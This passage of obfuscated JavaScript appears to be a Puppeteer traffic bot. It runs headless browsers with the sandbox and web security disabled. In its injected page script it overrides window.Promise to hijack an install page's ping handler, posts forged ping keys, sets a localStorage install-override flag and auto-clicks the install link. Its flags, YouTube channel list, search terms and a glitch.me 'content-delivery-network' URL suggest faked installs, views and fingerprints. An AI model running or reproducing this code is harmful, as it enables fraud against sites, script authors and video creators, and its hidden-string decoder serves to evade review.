0x98b + -0x3 * 0x2cf + -0x1215 * -0x1, J[0x693 + 0x166 + -0x3f5 * 0x2] = this['bytes'] << -0x84c + -0x1f19 + 0x4ed * 0x8, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x6b * 0x19 + -0x1 * -0x1645 + -0xbc2; J < 0x1 * 0x1 + 0xa3 * 0x2 + -0xf7; ++J)
                K = Q[J - (0x17c8 + -0x161a + -0x1ab)] ^ Q[J - (-0x1e72 + -0x1b1c + 0x222 * 0x1b)] ^ Q[J - (-0x21a * 0x8 + 0x258 + 0x16 * 0xa9)] ^ Q[J - (-0x1f * 0x101 + -0x1be6 + 0x3b15)], Q[J] = K << -0x8 * 0x20b + 0x13 * 0x10a + 0x365 * -0x1 | K >>> -0x1601 + -0x3dc + 0x2 * 0xcfe;
              for (J = 0x1b7 * 0x12 + 0x1b38 + -0x3a16; J < -0x174a + -0x2f9 * 0xb + 0x3811; J += -0x7 * -0x2b3 + -0x13c7 + 0x4d * 0x3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x21ce * -0x1 + 0x1274 * 0x1 + -0x343d | L >>> -0xb18 + -0x2ea + 0xe1d) + (M & N | ~M & O) + P + (-0x225a2a42 + 0x79e26e8 + 0x753e7cf3) + Q[J] << 0xec5 + 0x6d * 0x55 + 0x4a2 * -0xb) << 0x1 * 0x3ab + 0x12b3 + 0x773 * -0x3 | P >>> 0x126e + -0x22e6 + -0x1 * -0x1093) + (L & (M = M << -0x1568 + 0x168 * 0xc + -0x7 * -0xaa | M >>> 0x2 * -0x1271 + 0x1 * -0x1293 + -0x1 * -0x3777) | ~L & N) + O + (0x2cd1af4b + 0x5 * 0x1ed1c297 + -0x6c6802a5) + Q[J + (0x69b + 0xbd8 + -0x3 * 0x626)] << 0x1 * -0x1101 + -0x365 + 0x1 * 0x1466) << 0x5a7 + 0x1697 + 0x55 * -0x55 | O >>> 0x5c + -0xf9 * -0x1 + -0x9d * 0x2) + (P & (L = L << 0x7b * -0x19 + -0x1cde + 0x28ff | L >>> 0x27 * 0xfd + 0xde5 + -0x6 * 0x8bd) | ~P & M) + N + (0x251e3dc4 + 0x97fc41f * 0x8 + 0x35 * -0x6d2af7) + Q[J + (0xb1a + 0x1777 + 0x228f * -0x1)] << 0x222b + 0x1196 + -0x33c1) << -0x1559 * -0x1 + 0x1d16 + 0x1935 * -0x2 | N >>> -0x2402 * -0x1 + -0x5 * 0x170 + -0x1 * 0x1cb7) + (O & (P = P << 0x268 + 0x14f * 0x3 + -0x25 * 0x2b | P >>> -0x6 * -0x25e + -0x32 * -0x67 + 0x12 * -0x1e8) | ~O & L) + M + (-0x1fae756a + -0x44b00ec + 0x2d08e1 * 0x2cf) + Q[J + (-0x1b * -0x2 + 0x1ae7 + -0x1b1a * 0x1)] << -0x213c + 0x22cd + -0x191) << -0xb * -0x57 + 0x1b3 * 0x1 + -0x13 * 0x49 | M >>> -0x9ed + 0x25e1 + -0x1bd9) + (N & (O = O << -0x5d8 * 0x2 + 0x1 * -0x41b + 0x1 * 0xfe9 | O >>> 0x1d44 * -0x1 + -0x5 * 0x1c9 + 0x2633) | ~N & P) + L + (-0x34fdcce3 * 0x1 + -0x8748133d + -0xcbb * -0x15e61b) + Q[J + (0x11f0 + -0x2 * -0x12ec + -0x37c4)] << -0x68 * 0xe + -0x768 + 0xd18, N = N << -0xa * 0xd0 + 0x127b + -0xa3d | N >>> -0x1f6c + 0x1 * 0x12b9 + 0x1 * 0xcb5;
              for (; J < -0x1a21 * 0x1 + 0x1991 + 0xb8; J += -0x1eb * -0x2 + 0x3f3 + -0x7c4)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x50 + -0xd95 + 0xd4a | L >>> 0x6a3 * -0x5 + -0x2f * -0xbc + -0x13a) + (M ^ N ^ O) + P + (0x1ff737bd + 0x2 * 0x55da894c + -0x115 * 0x55c8e4) + Q[J] << 0x2036 + -0x26eb + 0x6b5) << -0x1578 + 0x494 + -0x25 * -0x75 | P >>> 0x141 + 0x2024 + 0x10a5 * -0x2) + (L ^ (M = M << 0x308 * 0x8 + -0x24b9 + -0x1 * -0xc97 | M >>> -0x37d * -0xa + 0x16db * 0x1 + 0x39bb * -0x1) ^ N) + O + (-0xcc0d * -0xcd1 + -0x79e56 * 0x183b + 0x1232 * 0xfad23) + Q[J + (0x72 * -0x26 + -0x23 * 0x62 + 0x1e53)] << 0x1c37 + 0x1b * 0xde + -0x33a1) << 0xe * 0x2 + 0x2 * -0x8fe + 0x1fd * 0x9 | O >>> 0x1d4 + -0x25b3 * 0x1 + -0x5ff * -0x6) + (P ^ (L = L << -0x3e6 * 0x1 + 0x1cf6 + -0xc79 * 0x2 | L >>> -0x69e + -0x1 * -0xe4b + 0x97 * -0xd) ^ M) + N + (-0x66e046b1 + 0x19fdaf47 + 0xbbbc830b) + Q[J + (-0x2 * -0xe28 + -0x2 * -0xbe0 + -0x3 * 0x115a)] << -0x157 * -0x1d + -0xdde + -0x18fd) << 0x1 * 0x1bfb + 0x1 * 0x8bf + -0x1 * 0x24b5 | N >>> 0x4 * 0x778 + -0x2253 + 0x48e) + (O ^ (P = P << -0xad7 + 0x2185 + -0x2d2 * 0x8 | P >>> 0x14 * 0x4d + 0x383 * -0x7 + 0x1 * 0x1293) ^ L) + M + (-0x939 * -0x6e0a2 + -0x2a56 * 0x1fb1b + 0x8348fea1) + Q[J + (-0x455 * -0x5 + 0x45d * -0x3 + -0x7 * 0x139)] << 0x24b8 + 0x5f0 + 0xb6 * -0x3c) << -0xb1 + 0xeb * -0x1d + 0x1 * 0x1b55 | M >>> -0xd2 * 0x25 + 0x4f2 + 0x1983) + (N ^ (O = O << -0x2416 + 0x15c + -0x116c * -0x2 | O >>> -0x1115 + 0x811 + 0x23 * 0x42) ^ P) + L + (0x577ee0b0 * 0x2 + 0x33b9606a + 0x3b3db * -0x1f4b) + Q[J + (-0x4 * 0x222 + -0x8 * 0x169 + 0x6c * 0x2f)] << 0x58c + 0x1ef * 0xb + -0x1ad1, N = N << -0x377 * -0x8 + -0xe9c + -0x2 * 0x67f | N >>> -0x41b + -0x231a + 0x2737 * 0x1;
              for (; J < -0x2 * -0x714 + -0x1c65 + 0x1 * 0xe79; J += 0x1 * 0x219d + 0x11a0 + 0x16 * -0x254)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x155 * -0x1d + -0x6cb + 0x2d71 | L >>> -0x633 + 0x91e + -0x2d0) + (M & N | M & O | N & O) + P - (-0xcedbefa * -0x4 + -0xb7d92835 + 0xf5066f71) + Q[J] << 0x6 * 0x607 + -0x78d * -0x2 + -0x3344) << -0x8f2 + 0xcab + -0x3b4 | P >>> -0x3 * 0x2ef + 0x1af + 0x739) + (L & (M = M << -0x131e * 0x2 + -0x1 * 0x1cf3 + 0x1 * 0x434d | M >>> -0x10ae + -0x35 * 0x1d + -0x25 * -0x9d) | L & N | M & N) + O - (0x5772ce53 + 0x54bef * 0x1e0e + 0x1 * -0x85beb441) + Q[J + (-0x56 * -0x68 + 0x12c2 + -0x35b1)] << 0x23c9 + 0x26b0 * -0x1 + 0x2e7) << -0x152b * -0x1 + 0xd86 + -0x27a * 0xe | O >>> -0x3b + 0x6d4 + -0x67e) + (P & (L = L << -0x110b * -0x1 + -0x1 * 0x2339 + -0x4 * -0x493 | L >>> -0x268b + -0x93b + 0x2fc8) | P & M | L & M) + N - (0xaa004f96 + 0x2e104391 + -0x672c5003) + Q[J + (-0x5e * 0x3e + -0x114e + 0x2814)] << 0x15 * -0x1b6 + -0x1cc5 + 0x40b3) << -0x4 * -0x8d4 + -0x28f * 0xd + 0x82 * -0x4 | N >>> -0x1 * -0x9be + 0x2306 + -0x2ca9) + (O & (P = P << 0x5 * 0x623 + 0x9 * 0x1e2 + 0x2f83 * -0x1 | P >>> 0x20f1 * 0x1 + -0xa7 * 0x1f + 0x65b * -0x2) | O & L | P & L) + M - (0x3e7f2b2c + 0x1571861e + 0x1cf391da) + Q[J + (-0x17cc + 0x131 + 0x169e)] << 0x148a * -0x1 + -0xbe9 + 0x2073) << 0x2367 + -0x1a21 + 0x941 * -0x1 | M >>> -0x8b2 * 0x1 + -0x1 * -0xfe9 + -0x71c) + (N & (O = O << 0x1644 + 0xa0f * -0x1 + -0xc17 | O >>> -0x37 + -0x3 * -0xb89 + -0x2262) | N & P | O & P) + L - (-0xaa560b68 + -0x11 * 0x249e1b1 + 0x142224b4d) + Q[J + (-0x3b * 0x1f + -0xe3e + 0x1567)] << 0x37 * -0x22 + 0x233 * 0x1 + 0x1 * 0x51b, N = N << 0x23 * -0xdc + 0x106 * 0x1b + 0x148 * 0x2 | N >>> 0x1451 + -0x23d6 + 0xf87;
              for (; J < 0x22d3 + -0x1e * 0x37 + -0x1c11; J += 0x469 + -0x247 + -0x21d * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xbba + 0x2b0 * 0x8 + -0x9c1 | L >>> 0x1 * -0x925 + -0x11 * 0x195 + 0x1 * 0x2425) + (M ^ N ^ O) + P - (-0x1b61d * -0xc32 + -0x1 * -0x3cd6d555 + -0x1c1884d5) + Q[J] << -0x2 * 0x63 + 0x1 * -0x1936 + 0x19fc) << 0x21c8 + -0x12fb + -0xec8 | P >>> -0x1a69 + -0x270e * -0x1 + -0x282 * 0x5) + (L ^ (M = M << -0x41 * -0x65 + -0x2343 + 0x9bc | M >>> 0x1 * -0x6bc + 0x2 * -0xf77 + 0x25ac) ^ N) + O - (0x1e1d56ba * 0x2 + -0x82df509 + 0x15d * 0x125cb) + Q[J + (0x66 * 0x1b + 0x217a + 0x2c3b * -0x1)] << -0x1a18 + 0xc36 + -0xde2 * -0x1) << 0x1 * -0xe03 + 0x1dc3 + -0xfbb | O >>> 0x1de9 + -0x21a7 * -0x1 + -0x3f75) + (P ^ (L = L << -0x413 * 0x4 + -0xe61 + -0x1 * -0x1ecb | L >>> -0x2574 + 0x3 * -0x97a + 0x41e4) ^ M) + N - (-0x1249 * 0x49a2b + 0x2bda234 + 0x87069839) + Q[J + (0x1df0 + 0x149d * -0x1 + -0x1dd * 0x5)] << -0x17f * -0x3 + 0x1b * 0x96 + -0x144f) << -0x43f + -0x1c1 * -0x11 + 0x198d * -0x1 | N >>> 0x31 * -0x69 + 0x55 * -0x11 + -0xd * -0x1fd) + (O ^ (P = P << -0xa * 0x35 + 0x1ad5 * -0x1 + 0x187 * 0x13 | P >>> 0x1b82 + 0x18b * 0x19 + -0x4213) ^ L) + M - (0x2c8e31d * -0x1d + 0x18852c9a * 0x3 + 0x4ad7ef9 * 0xd) + Q[J + (-0x1 * -0x26cf + 0x1618 + -0x4 * 0xf39)] << 0x8 * -0x220 + -0x4 * -0x60a + -0x728) << -0xbf * 0x34 + -0x2fb * -0x3 + 0x1de0 | M >>> -0x1e5f + 0x11fb * -0x2 + 0x4270) + (N ^ (O = O << 0x1bd4 + -0x7a7 + -0x140f | O >>> 0x1965 + 0x136d * -0x1 + -0x5f6) ^ P) + L - (-0x6a54705e + -0xb92 * -0x78eed + 0x487dfc5e) + Q[J + (-0xf0a + -0x1abb + 0x29c9)] << 0x1ff4 + -0x5 * -0x29f + 0x5 * -0x903, N = N << -0x2b * -0x2f + -0x17c8 + 0x1001 | N >>> 0x434 + 0x13ab + -0x17dd;
              this['h0'] = this['h0'] + L << -0xb70 + 0x1ffe + -0x148e, this['h1'] = this['h1'] + M << -0x2392 + -0x542 * 0x6 + 0x431e, this['h2'] = this['h2'] + N << -0x603 + -0x17 * -0x1 + 0x5ec, this['h3'] = this['h3'] + O << 0x21f4 + 0x1041 + 0x1 * -0x3235, this['h4'] = this['h4'] + P << -0x21b0 + 0xe7e + -0x6 * -0x333;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x3 * 0x18d + -0x1 * -0x25bb + -0x2a46 & -0x22e9 + -0x1 * 0x17c1 + 0x3ab9] + w[J >> 0x146c + -0x653 + 0x5 * -0x2cd & -0x34b * 0x8 + -0x2118 + 0x3b7f] + w[J >> -0x11f7 + -0x1 * 0xbb9 + 0x1dc4 & 0x355 * 0x7 + -0x11f + 0x1625 * -0x1] + w[J >> -0x801 + 0x1 * 0x69 + 0x7a8 & 0x2492 + 0x943 + -0x2dc6] + w[J >> -0x2009 + -0xfa9 + 0x2fbe & -0x2b5 + -0xd1 * 0x1d + 0x1a71] + w[J >> 0x27 * 0xc7 + 0x5 + -0xa1a * 0x3 & -0x128e + 0x11 * -0x147 + -0x4 * -0xa15] + w[J >> 0x1327 + 0xe2b + -0x214e & -0x9 * 0x35e + 0xb1a + 0x1343] + w[-0x3 * -0x4e4 + 0x16f + -0x100c & J] + w[K >> 0x6 * 0x53 + -0x10d1 + 0xefb & 0x9 * -0x306 + -0x925 + 0x246a] + w[K >> 0x657 * 0x5 + -0x1e56 + -0x41 * 0x5 & -0x6ca * -0x2 + 0x24b * 0xd + 0x2f * -0xec] + w[K >> -0x1848 + -0x1 * -0x160d + 0x24f & 0x18c5 + 0x1311 + -0x2bc7] + w[K >> -0x1f * 0x13d + -0x2028 + 0x469b & -0x21b4 + 0x2405 + -0x242] + w[K >> 0xbc2 + -0x165d + 0x1b * 0x65 & 0x1bd7 + 0x1b79 + -0x7b * 0x73] + w[K >> -0xb * -0xdd + -0x1 * -0x13b8 + -0x1d2f & 0xdee + -0x151a + 0x1 * 0x73b] + w[K >> 0x28a + 0x9 * 0x14b + -0xe29 & -0x9cb * 0x2 + -0x1f23 + 0x32 * 0x104] + w[0x7 * 0x3bf + 0x24e8 + -0x3f12 & K] + w[L >> -0x397 * 0x9 + -0xa * 0x7d + 0x254d & 0x181 * -0x1 + 0x2424 + -0x2294] + w[L >> -0x110b * -0x1 + 0x18bd + -0x1 * 0x29b0 & 0x51f + 0xdd2 + 0x2 * -0x971] + w[L >> 0x4 * 0x7b0 + 0x1d8 * 0x13 + -0x41b4 & 0x944 + 0x7 * 0x1e9 + 0x4 * -0x5a5] + w[L >> 0x65 * -0x3b + 0x137 * 0x1d + -0x2 * 0x5f2 & 0xe87 + -0x254f * -0x1 + -0x33c7] + w[L >> 0xf74 * 0x2 + 0xb32 + -0x2a0e & -0x455 * 0x3 + -0x1 * -0x203f + -0x1331 * 0x1] + w[L >> -0x1367 * 0x1 + -0x257c + 0x38eb & 0x59f * 0x1 + 0x3 * 0x4c1 + -0x13d3] + w[L >> 0x2482 + 0xf98 + -0x3416 & 0x8 * 0xc + 0x22da + -0x232b] + w[-0x933 * 0x1 + 0x202f + -0x16ed & L] + w[M >> 0x1c12 + 0xc88 * -0x1 + -0xf6e & 0x24ae + 0x1243 + -0x2 * 0x1b71] + w[M >> 0xe13 + 0x155 * 0xb + 0x5ba * -0x5 & -0x1d6b + 0x3e6 * -0x9 + -0x10 * -0x409] + w[M >> 0x1635 + 0x6 * 0x44c + -0x2fe9 & 0x1369 + -0x1 * 0x505 + -0xe55] + w[M >> -0x18ca + -0x2a5 + 0x1b7f * 0x1 & 0x23c6 + 0x19b5 + -0x3d6c] + w[M >> -0x5 * -0x694 + -0x1bf2 + -0x4e6 & -0xa * 0x127 + 0x71 * -0x37 + 0x132 * 0x1e] + w[M >> 0x87a + -0x1881 + 0x100f & 0x1c2b + 0x1 * 0xe8a + 0x1 * -0x2aa6] + w[M >> -0x89c + -0x29f * -0x9 + -0xef7 & -0x31b + -0x1fbb + -0x22e5 * -0x1] + w[-0x1bfa + -0xc0d + 0x2816 & M] + w[N >> 0x315 * 0xb + 0x117a + -0x1 * 0x3345 & -0x668 + -0x11 * -0x7f + -0x1f8] + w[N >> 0xb0a + -0x5e * 0xf + 0x57 * -0x10 & -0xb20 + 0x5 * 0x10d + -0x2f7 * -0x2] + w[N >> 0x6f * 0x2 + -0x4d7 * 0x7 + 0x2117 & -0x10fa + 0x709 * 0x2 + -0x1 * -0x2f7] + w[N >> 0x4b5 + -0xafc + 0x657 * 0x1 & -0x2345 * 0x1 + 0x1e74 + 0x4e0] + w[N >> 0x8d * -0x7 + -0x1 * -0x1e71 + 0x56 * -0x4f & -0x139f + 0x1a3 * -0x5 + -0x3fb * -0x7] + w[N >> 0x1b3a + 0x1ac2 + -0x35f4 & 0x1777 + 0x605 * 0x1 + -0x1d6d] + w[N >> -0x383 * -0x2 + -0x117 * 0x1a + 0x1554 & -0xa28 + -0xb * -0x192 + -0x70f * 0x1] + w[0x877 + 0x2604 + -0x2e6c & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1df * 0x14 + 0x197c + -0x3ed0 & 0x1040 + -0x8 * 0x425 + -0x1 * -0x11e7,
                J >> 0x11c1 * -0x2 + 0x53e * -0x5 + 0x3dc8 & -0xfb * -0x27 + -0x4 * 0x227 + -0x1ca2,
                J >> 0x4 * -0x60d + 0x9 * 0x2a8 + -0x4 * -0x15 & -0x41a + 0x1ced + -0x17d4,
                -0x5 * 0x578 + -0xfb7 + -0x2c0e * -0x1 & J,
                K >> 0x15d6 + 0x21fa * 0x1 + 0x2 * -0x1bdc & -0x4 * -0x125 + -0x4 * 0x479 + 0xe4f,
                K >> 0xf6 + -0xc59 + 0xb73 & -0x16cd + 0x7a1 * 0x1 + -0x102b * -0x1,
                K >> 0x7 * -0x7d + -0x2180 + 0x24f3 & 0x48b * 0x3 + -0xf13 + -0x5 * -0x7d,
                -0x10e8 + -0x25 * -0xef + -0x10a4 & K,
                L >> 0x8 * 0x13c + -0x11 * -0x115 + -0x1c2d & 0x4 * -0x304 + 0x2310 + -0x1 * 0x1601,
                L >> 0x186f + 0x1 * -0xc88 + 0x1b1 * -0x7 & 0x939 + -0xcd + -0x1 * 0x76d,
                L >> -0x98 * 0x18 + -0x1a37 + 0x287f & -0x13 * -0x1fb + -0x1686 + -0x81 * 0x1c,
                0x31 * 0xa3 + -0x16d8 + -0x1d7 * 0x4 & L,
                M >> 0x162e + 0x1bc5 * -0x1 + 0x1e5 * 0x3 & -0x1fd3 + -0x834 + -0x3b * -0xb2,
                M >> -0x1c45 * 0x1 + 0x11fa + -0xa5b * -0x1 & -0x20ab + -0x6cc + 0x143b * 0x2,
                M >> -0x2cc * 0x2 + 0xb * 0x25f + -0x1475 & -0x980 + -0x3d * -0x71 + -0x106e,
                -0x1e38 + -0x13 * -0x15a + 0xd * 0x6d & M,
                N >> 0xc * -0x1e3 + 0x3df + 0x12dd * 0x1 & 0x2 * -0xeb1 + -0x5ab * -0x2 + 0x130b,
                N >> 0x29 * -0xc7 + -0x19be + 0x39ad & 0x1 * 0x8a5 + 0x19 * -0x44 + -0x102,
                N >> 0x1ba0 + 0x22ed + -0x5af * 0xb & 0xb * 0x15d + -0x24a1 + -0x1 * -0x16a1,
                0x61 * -0x59 + -0x4fe * 0x1 + 0x27b6 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x7c3 + 0x26fa + 0x3 * -0xa61), (K = new DataView(J))['setUint32'](-0x25aa + -0x255e + 0x4b08, this['h0']), K['setUint32'](-0x1002 + -0x112d * 0x1 + 0x2133, this['h1']), K['setUint32'](-0x4f7 * -0x1 + -0x22bb + 0x773 * 0x4, this['h2']), K['setUint32'](0xa * -0x50 + 0x5 * 0x4f6 + -0x15a2 * 0x1, this['h3']), K['setUint32'](-0x1 * 0x14b7 + -0x18e9 + 0x44 * 0xac, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x121a + -0x1b40 + 0x926];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x2614 + -0xdb * -0x8 + 0x1f3c;
            J[0x12f7 * -0x2 + -0x12b + 0x2719]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0xb6 * -0x1f + 0x7d6 * -0x3 + 0x2 * 0x16c6] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x69b + -0x1 * -0x18b2 + -0xfa6 * 0x2), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x202b + -0xcd8 + -0x9a9 * 0x2;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1 * -0x2631 + -0x166a + -0x9eb), Promise['resolve'](-0x1ba1 + -0x4 * 0x577 + 0x317e);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x83f + -0x1128 + 0x1967; j < 0x1 * -0x155f + -0x231a * -0x1 + -0xdba; j++)
    i();
}
const NETWORK_PATIENCE = -0x66c + 0x30a5 * 0x1 + -0x35 * 0x35 + (-0x54f + -0x26db * 0x1 + 0x37e2) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x18 * 0x14 + 0xbe8 + -0xa05) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + Z(0xb, 'u0yh'),
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + Z(0xf, 'LxtT') + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x2bf * -0x6 + -0x1d * -0xc5 + -0x26cb; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x321 * -0x5 + 0x817 + 0xd9 * -0x1c);
    let h = e[f];
    if (b['BaBaqH'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x4a0 * -0x3 + 0x2512 + -0xb99 * 0x2, s, t, u = 0x1 * -0x393 + 0x481 * 0x1 + 0x11 * -0xe; t = n['charAt'](u++); ~t && (s = r % (0x1 * -0x80f + 0xf7a + 0x17b * -0x5) ? s * (0x1 * -0x6a3 + -0x11 * 0x9f + 0x1172) + t : t, r++ % (-0x268e + 0x54d + 0x1 * 0x2145)) ? p += String['fromCharCode'](-0x1a6c + 0x3 * 0x4d3 + -0x679 * -0x2 & s >> (-(-0x9 * 0xdf + -0x225 * -0x12 + -0x1ec1) * r & -0x4cf * 0x1 + 0xa0c + -0x537)) : 0xe * -0xb3 + 0x1 * 0xe6b + -0x5 * 0xed) {
          t = o['indexOf'](t);
        }
        for (let v = -0x2 * -0x107 + 0xf0d * 0x2 + -0x2028, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x617 * -0x6 + 0x466 + 0x12 * 0x1ca))['slice'](-(0xf * 0x1c9 + 0xa0b * -0x2 + 0x3b * -0x1d));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1 * 0xc5b + -0x21b3 * 0x1 + 0x1558,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1 * 0x664 + -0xef * 0x1 + 0x7d * 0xf; u < 0x808 + -0x1bef + 0x14e7; u++) {
          p[u] = u;
        }
        for (u = 0x850 + 0xd40 + -0x1590; u < 0x3 * -0x55c + 0x25 * -0x71 + 0x1 * 0x2169; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1a45 * 0x1 + 0xb0e + 0x1 * 0x1037), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0xf07 * 0x2 + -0x1b4f + 0x13 * -0x25, q = -0x269 * 0x4 + 0x2 * 0x2f6 + 0x4 * 0xee;
        for (let v = -0x9 * 0x1d + -0x17ab + -0x4f0 * -0x5; v < n['length']; v++) {
          u = (u + (-0x6c0 + 0x1 * 0x665 + 0x2 * 0x2e)) % (-0x24df * 0x1 + -0xacd + 0x30ac), q = (q + p[u]) % (0x1a7a + 0x209 + -0x1b83 * 0x1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x25b0 + -0x1 * 0xb2b + 0x31db)]);
        }
        return t;
      };
      b['rieejT'] = m, c = arguments, b['BaBaqH'] = !![];
    }
    const j = e[0x1bb * -0xd + -0x19f * -0x1 + 0x14e0],
      k = f + j,
      l = c[k];
    return !l ? (b['tcFhjh'] === undefined && (b['tcFhjh'] = !![]), h = b['rieejT'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + Z(0x9, 'tCC@') + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 